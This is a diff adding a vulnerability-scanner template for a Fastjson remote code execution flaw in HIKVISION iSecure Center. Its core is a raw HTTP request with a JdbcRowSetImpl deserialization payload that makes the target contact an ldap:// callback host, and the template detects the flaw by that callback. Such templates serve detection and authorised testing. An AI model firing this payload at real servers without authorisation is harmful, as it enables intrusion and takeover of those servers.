@@ -1,0 +1,33 @@
+id: hikvision-isecure-rce
+info:
+  name: HIKVISION iSecure Center Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    HIKVISION iSecure Center has a Fastjson remote command execution vulnerability. An attacker can use this vulnerability to execute arbitrary code on the server side, write a backdoor, obtain server permissions, and then control the entire web server.
+  tags: rce, fastjson
+  reference:
+    - https://www.hikvision.com/cn/
+
+http:
+  - raw:
+      - |
+        POST /bic/ssoService/v1/applyCT HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {
+          "a": {"@type": "java.lang.Class", "val": "com.sun.rowset.JdbcRowSetImpl"},
+          "b": {"@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://{{interactsh-url}}", "autoCommit": true},
+          "hfe4zyyzldp": "="
+        }
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
